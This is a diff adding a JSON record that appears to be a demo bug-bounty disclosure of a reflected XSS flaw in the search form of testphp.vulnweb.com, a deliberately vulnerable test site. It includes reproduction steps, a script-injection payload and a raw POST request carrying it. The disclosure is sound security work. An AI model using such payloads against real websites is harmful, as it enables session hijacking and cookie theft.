@@ -1,0 +1,14 @@
+{
+  "id": 800001,
+  "title": "Reflected XSS in Search Function via searchFor Parameter on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 60, "name": "Cross-site Scripting (XSS) - Reflected"},
+  "vulnerability_information": "## Summary\nThe search functionality at `http://testphp.vulnweb.com/search.php?test=query` is vulnerable to Reflected Cross-Site Scripting. When a user submits a search via POST request, the `searchFor` parameter value is reflected directly in the response HTML without sanitization.\n\n## Steps to Reproduce\n1. Navigate to `http://testphp.vulnweb.com/`\n2. Locate the search form on the page\n3. Enter the following XSS payload in the search field: `<script>alert(document.domain)</script>`\n4. Click the 'go' button to submit the search\n5. Observe that an alert box appears showing the domain name, confirming JavaScript execution\n\nAlternatively, send this HTTP request directly:\n```\nPOST /search.php?test=query HTTP/1.1\nHost: testphp.vulnweb.com\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=<script>alert(document.domain)</script>&goButton=go\n```\n\nThe response contains:\n```html\n<h2 id='pageName'>searched for: <script>alert(document.domain)</script></h2>\n```\n\nThe payload is reflected without any encoding or sanitization.\n\n## Impact\nAn attacker can craft a malicious form that auto-submits to the search endpoint, causing arbitrary JavaScript execution in the victim's browser. This enables session hijacking, cookie theft, and phishing.",
+  "disclosed_at": "2025-05-01T10:00:00.000Z",
+  "bounty_amount": "500.0"
+}
